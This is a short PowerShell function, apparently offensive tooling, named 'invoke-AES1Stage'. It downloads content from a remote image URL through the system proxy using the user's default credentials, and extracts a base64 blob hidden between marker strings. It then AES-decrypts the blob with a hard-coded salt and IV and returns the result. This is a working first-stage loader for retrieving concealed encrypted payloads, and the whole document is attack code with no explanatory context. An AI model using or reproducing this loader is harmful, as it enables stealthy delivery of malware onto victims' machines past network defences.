function invoke-AES1Stage
{
 Param (
            [string]$key,
            [string]$ImageUrl
       )  
        $request = New-Object System.Net.WebCLient
        $proxy = New-Object System.Net.webproxy
        $request.proxy = $proxy
        $request.usedefaultcredentials = "true"
        $inputentirestring = $request.Downloadstring($ImageUrl)
        [array] $xvalue = ([regex]'wootwoot').split($inputentirestring)
        [array] $yvalue = ([regex]'weetweet').split($xvalue[1])
        $InputString = $yvalue[0]
        $InputBytes = [system.Convert]::FromBase64String($InputString)
        $AES = New-Object System.Security.Cryptography.AesManaged
        $Passphrase=$key
        $salt="My Voice is my P455W0RD!"
        $init="Yet another key"
        $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
        $salt = [Text.Encoding]::UTF8.GetBytes($salt)
        $AES.BlockSize = 128
        $AES.KeySize = 256
        $AES.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32)
        $AES.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $DEcryptor = $AES.CreateDEcryptor()
        $MemoryStream = New-Object -TypeName System.IO.MemoryStream
        $StreamMode =[System.Security.Cryptography.CryptoStreamMode]::Write
        $CryptoStream = New-Object -TypeName System.Security.Cryptography.CryptoStream -ArgumentList $MemoryStream,$DEcryptor,$StreamMode
        $CryptoStream.Write($InputBytes, 0, $InputBytes.Length)
        [byte[]]$DEncrypted = $MemoryStream.ToArray()
        $DEncrypteds = [Text.Encoding]::utf8.GetString($DEncrypted)
        return $DEncrypteds
      
}

